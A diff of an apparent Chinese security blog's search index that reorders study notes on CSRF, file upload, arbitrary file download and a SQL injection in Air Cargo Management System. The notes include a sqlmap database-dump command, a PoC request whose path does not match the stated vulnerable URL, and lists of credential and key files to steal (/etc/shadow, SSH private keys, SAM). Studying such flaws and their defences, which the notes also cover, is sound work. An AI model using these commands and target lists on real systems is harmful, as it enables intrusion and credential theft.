@@ -1,33 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Air Cargo Management System v1.0存在SQL注入漏洞</title>
-    <url>/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h1><p>Air Cargo Management System是一款航空货运管理系统。该系统包含不同的相关模块，例如交易。它有两个用户界面，即管理面板和公共端，Air Cargo Management System存在SQL注入漏洞，攻击者可以利用漏洞获取数据库数据权限等。</p>
-<span id="more"></span>
-<h1 id="二、-漏洞细节"><a href="#二、-漏洞细节" class="headerlink" title="二、 漏洞细节"></a>二、 漏洞细节</h1><p>漏洞存在于\acms\classes\Users.php这个文件中，第 130行，网站通过post方式获取了id参数的值，然后在第132行拼接进数据库查询语句中，中间没有进行过滤，导致了漏洞的产生。</p>
-<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152908077.png" alt="image-20220830152908077"></p>
-<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><p>漏洞验证：</p>
-<p>漏洞url: <a href="http://localhost/acms/classes/Users.php?f=delete_user">http://localhost/acms/classes/Users.php?f=delete_user</a></p>
-<p>访问漏洞URL，使用抓包软件进行抓包</p>
-<p>Select sleep(1)：</p>
-<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152936163.png" alt="image-20220830152936163"></p>
-<p>Select sleep(3)：</p>
-<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152950292.png" alt="image-20220830152950292"></p>
-<p>使用sqlmap跑出数据库命令：sqlmap -r 222.txt –risk 3 –level 4 –dbms mysql –dbs</p>
-<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830153007912.png" alt="image-20220830153007912"></p>
-<h1 id="四、PoC"><a href="#四、PoC" class="headerlink" title="四、PoC"></a>四、PoC</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/bsms/manage_product.php?id=1*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/bsms/?page=products</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=e2cd18647586f5b17de88fd20876023d</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-        <tag>PHP代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CSRF 跨站请求伪造漏洞</title>
     <url>/2022/03/08/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>CSRF跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击</p>
@@ -79,6 +52,33 @@
       </categories>
       <tags>
         <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Air Cargo Management System v1.0存在SQL注入漏洞</title>
+    <url>/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h1><p>Air Cargo Management System是一款航空货运管理系统。该系统包含不同的相关模块，例如交易。它有两个用户界面，即管理面板和公共端，Air Cargo Management System存在SQL注入漏洞，攻击者可以利用漏洞获取数据库数据权限等。</p>
+<span id="more"></span>
+<h1 id="二、-漏洞细节"><a href="#二、-漏洞细节" class="headerlink" title="二、 漏洞细节"></a>二、 漏洞细节</h1><p>漏洞存在于\acms\classes\Users.php这个文件中，第 130行，网站通过post方式获取了id参数的值，然后在第132行拼接进数据库查询语句中，中间没有进行过滤，导致了漏洞的产生。</p>
+<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152908077.png" alt="image-20220830152908077"></p>
+<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><p>漏洞验证：</p>
+<p>漏洞url: <a href="http://localhost/acms/classes/Users.php?f=delete_user">http://localhost/acms/classes/Users.php?f=delete_user</a></p>
+<p>访问漏洞URL，使用抓包软件进行抓包</p>
+<p>Select sleep(1)：</p>
+<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152936163.png" alt="image-20220830152936163"></p>
+<p>Select sleep(3)：</p>
+<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830152950292.png" alt="image-20220830152950292"></p>
+<p>使用sqlmap跑出数据库命令：sqlmap -r 222.txt –risk 3 –level 4 –dbms mysql –dbs</p>
+<p><img src="https://ax-x.github.io/2022/03/08/Air-Cargo-Management-System-v1-0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20220830153007912.png" alt="image-20220830153007912"></p>
+<h1 id="四、PoC"><a href="#四、PoC" class="headerlink" title="四、PoC"></a>四、PoC</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/bsms/manage_product.php?id=1*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/bsms/?page=products</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=e2cd18647586f5b17de88fd20876023d</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+        <tag>PHP代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -922,6 +922,35 @@
       </tags>
   </entry>
   <entry>
+    <title>文件下载漏洞个人总结</title>
+    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件下载功能没有对下载的文件类型、目录做合理严谨的过滤， 利用路径回溯符…/跳出程序本身的限制目录实现来下载任意文件，导致用户可以下载服务器的任意文件。</p>
+<span id="more"></span>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">存在读文件的函数</span><br><span class="line">读取文件的路径用户可控且未校验或校验不严</span><br><span class="line">输出了文件内容</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。</span><br><span class="line">可用得到的代码进一步代码审计，得到更多可利用漏洞</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br></pre></td></tr></table></figure>
+
+<h2 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">网站URL中存在下载参数，并且未进行过滤…<span class="regexp">/…/</span>…/字符，且输出了文件内容</span><br><span class="line">从链接上看</span><br><span class="line">从参数上看</span><br><span class="line">具体情况具体分析</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">获得站点源码（黑盒 -&gt; 白盒）</span><br><span class="line">获得站点与中间件配置文件</span><br><span class="line">获得应用于系统配置文件（ssh、mysql）</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">（信息收集信息&gt;猜路径 &gt;&gt;下载配置文件/代码文件 &gt;&gt; 利用服务器软件漏洞&gt; <span class="built_in">shell</span>&gt; 提权）</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br><span class="line">下载常规的配置文件，例如: ssh,weblogic,<span class="keyword">ftp</span>,mysql等相关配置下载各种.<span class="built_in">log</span>文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</span><br><span class="line">下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器</span><br></pre></td></tr></table></figure>
+
+<h2 id="常规文件位置"><a href="#常规文件位置" class="headerlink" title="常规文件位置"></a>常规文件位置</h2><p><strong>WEB应用</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">PHP</span></span><br><span class="line">1、获取inc/config·php获得数据库连接字符串中的口令信息。</span><br><span class="line"><span class="meta">#</span><span class="bash">asp</span></span><br><span class="line">1、获取inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。若是ACCESS数据库，可以得到数据库</span><br><span class="line">路径，在下载数据库内容。</span><br><span class="line"><span class="meta">#</span><span class="bash">aspx</span></span><br><span class="line">1、获取网站根目录web，config文件，获得数据库连接字符串中的口令信息。</span><br><span class="line">2、获取bin/*.dll文件，获取网站源码（不完整代码）。使用.NET refl ector工具打开编译后的dll文件。</span><br><span class="line"><span class="meta">#</span><span class="bash">JSP</span></span><br><span class="line">1、获取conf/tomcat-user.xml文件，获得tomcat管理界面的口令信息，上传war包GetShel1，</span><br><span class="line">2、获取WEB-INF/Web.xml文件，获得数据库连接字符串中的口令信息。</span><br></pre></td></tr></table></figure>
+
+<p><strong>应用，系统配置文件</strong></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">一、Windows</span><br><span class="line">C:\boot.ini<span class="regexp">//</span>查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml<span class="regexp">//</span>IIS配置文件</span><br><span class="line">C:\Windows\repair\sam<span class="regexp">//</span>存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini<span class="regexp">//</span>Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD <span class="regexp">//</span>Mysql root</span><br><span class="line">C:\Windows\php.ini<span class="regexp">//</span>php配置信息</span><br><span class="line">C:\Windows\my.ini<span class="regexp">//</span>Mysql配置信息</span><br><span class="line">C:\Windows\win.ini<span class="regexp">//</span>Windows系统的一个基本系统配置文件</span><br><span class="line">二、Linux</span><br><span class="line"><span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_ras.keystore</span><br><span class="line"><span class="regexp">/root/</span>.ssh<span class="regexp">/known_hosts/</span><span class="regexp">/记录每个访问计算机用户的公钥/</span>etc/passwd</span><br><span class="line"><span class="regexp">/etc/</span>shadow</span><br><span class="line"><span class="regexp">/etc/my</span>.cnf<span class="regexp">//my</span>sql配置文件</span><br><span class="line"><span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf<span class="regexp">//</span>apachel配置文件</span><br><span class="line"><span class="regexp">/root/</span>.bash_history<span class="regexp">//</span>用户历史命令记录文件</span><br><span class="line"><span class="regexp">/root/</span>.mysql._history<span class="regexp">//my</span>sql历史命令记录文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="任意文件下载漏洞防御"><a href="#任意文件下载漏洞防御" class="headerlink" title="任意文件下载漏洞防御"></a>任意文件下载漏洞防御</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line">下载路径不可控，而是程序自动生成后保存在数据库中，根据<span class="selector-tag">ID</span>进行下载</span><br><span class="line">对参数做严格的过滤，不能进行目录遍历（穿越）</span><br><span class="line">对下载路径进行过滤，如下载前对传入的参数进行过滤，并且对下载文件类型进行检查，是否是允许下载的类型</span><br><span class="line">过滤.(点)，使用户在<span class="selector-tag">url</span>中不能回溯上级目录</span><br><span class="line">正则严格判断用户输入参数的格式</span><br><span class="line">限定文件访问范围如<span class="selector-tag">PHP</span>里的（<span class="selector-tag">php</span><span class="selector-class">.ini</span>配置<span class="selector-tag">open_basedir</span>）</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传漏洞个人总结</title>
     <url>/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="什么是文件上传"><a href="#什么是文件上传" class="headerlink" title="什么是文件上传"></a>什么是文件上传</h2><p>文件上传漏洞是指上传文件的时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本等。用户可以上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。 常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。这种漏洞是getshell最快最直接的方法之一，上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件，有文件上传不一定有文件上传漏洞，要看代码情况。</p>
@@ -945,35 +974,6 @@
 <h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">当文件拓展名Apache没有配置解析器解析时，就会向前遍历，直到遇到配置的解析器解析的域名</span><br></pre></td></tr></table></figure>
 
 <h3 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">上传<span class="string">/.php</span>时就能作为php文件解析</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件下载漏洞个人总结</title>
-    <url>/2022/03/08/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件下载功能没有对下载的文件类型、目录做合理严谨的过滤， 利用路径回溯符…/跳出程序本身的限制目录实现来下载任意文件，导致用户可以下载服务器的任意文件。</p>
-<span id="more"></span>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">存在读文件的函数</span><br><span class="line">读取文件的路径用户可控且未校验或校验不严</span><br><span class="line">输出了文件内容</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。</span><br><span class="line">可用得到的代码进一步代码审计，得到更多可利用漏洞</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br></pre></td></tr></table></figure>
-
-<h2 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">网站URL中存在下载参数，并且未进行过滤…<span class="regexp">/…/</span>…/字符，且输出了文件内容</span><br><span class="line">从链接上看</span><br><span class="line">从参数上看</span><br><span class="line">具体情况具体分析</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">获得站点源码（黑盒 -&gt; 白盒）</span><br><span class="line">获得站点与中间件配置文件</span><br><span class="line">获得应用于系统配置文件（ssh、mysql）</span><br></pre></td></tr></table></figure>
-
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">（信息收集信息&gt;猜路径 &gt;&gt;下载配置文件/代码文件 &gt;&gt; 利用服务器软件漏洞&gt; <span class="built_in">shell</span>&gt; 提权）</span><br><span class="line">任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</span><br><span class="line">下载常规的配置文件，例如: ssh,weblogic,<span class="keyword">ftp</span>,mysql等相关配置下载各种.<span class="built_in">log</span>文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</span><br><span class="line">下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器</span><br></pre></td></tr></table></figure>
-
-<h2 id="常规文件位置"><a href="#常规文件位置" class="headerlink" title="常规文件位置"></a>常规文件位置</h2><p><strong>WEB应用</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">PHP</span></span><br><span class="line">1、获取inc/config·php获得数据库连接字符串中的口令信息。</span><br><span class="line"><span class="meta">#</span><span class="bash">asp</span></span><br><span class="line">1、获取inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。若是ACCESS数据库，可以得到数据库</span><br><span class="line">路径，在下载数据库内容。</span><br><span class="line"><span class="meta">#</span><span class="bash">aspx</span></span><br><span class="line">1、获取网站根目录web，config文件，获得数据库连接字符串中的口令信息。</span><br><span class="line">2、获取bin/*.dll文件，获取网站源码（不完整代码）。使用.NET refl ector工具打开编译后的dll文件。</span><br><span class="line"><span class="meta">#</span><span class="bash">JSP</span></span><br><span class="line">1、获取conf/tomcat-user.xml文件，获得tomcat管理界面的口令信息，上传war包GetShel1，</span><br><span class="line">2、获取WEB-INF/Web.xml文件，获得数据库连接字符串中的口令信息。</span><br></pre></td></tr></table></figure>
-
-<p><strong>应用，系统配置文件</strong></p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">一、Windows</span><br><span class="line">C:\boot.ini<span class="regexp">//</span>查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml<span class="regexp">//</span>IIS配置文件</span><br><span class="line">C:\Windows\repair\sam<span class="regexp">//</span>存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini<span class="regexp">//</span>Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD <span class="regexp">//</span>Mysql root</span><br><span class="line">C:\Windows\php.ini<span class="regexp">//</span>php配置信息</span><br><span class="line">C:\Windows\my.ini<span class="regexp">//</span>Mysql配置信息</span><br><span class="line">C:\Windows\win.ini<span class="regexp">//</span>Windows系统的一个基本系统配置文件</span><br><span class="line">二、Linux</span><br><span class="line"><span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_ras.keystore</span><br><span class="line"><span class="regexp">/root/</span>.ssh<span class="regexp">/known_hosts/</span><span class="regexp">/记录每个访问计算机用户的公钥/</span>etc/passwd</span><br><span class="line"><span class="regexp">/etc/</span>shadow</span><br><span class="line"><span class="regexp">/etc/my</span>.cnf<span class="regexp">//my</span>sql配置文件</span><br><span class="line"><span class="regexp">/etc/</span>httpd<span class="regexp">/conf/</span>httpd.conf<span class="regexp">//</span>apachel配置文件</span><br><span class="line"><span class="regexp">/root/</span>.bash_history<span class="regexp">//</span>用户历史命令记录文件</span><br><span class="line"><span class="regexp">/root/</span>.mysql._history<span class="regexp">//my</span>sql历史命令记录文件</span><br></pre></td></tr></table></figure>
-
-<h2 id="任意文件下载漏洞防御"><a href="#任意文件下载漏洞防御" class="headerlink" title="任意文件下载漏洞防御"></a>任意文件下载漏洞防御</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line">下载路径不可控，而是程序自动生成后保存在数据库中，根据<span class="selector-tag">ID</span>进行下载</span><br><span class="line">对参数做严格的过滤，不能进行目录遍历（穿越）</span><br><span class="line">对下载路径进行过滤，如下载前对传入的参数进行过滤，并且对下载文件类型进行检查，是否是允许下载的类型</span><br><span class="line">过滤.(点)，使用户在<span class="selector-tag">url</span>中不能回溯上级目录</span><br><span class="line">正则严格判断用户输入参数的格式</span><br><span class="line">限定文件访问范围如<span class="selector-tag">PHP</span>里的（<span class="selector-tag">php</span><span class="selector-class">.ini</span>配置<span class="selector-tag">open_basedir</span>）</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>web安全</category>
       </categories>
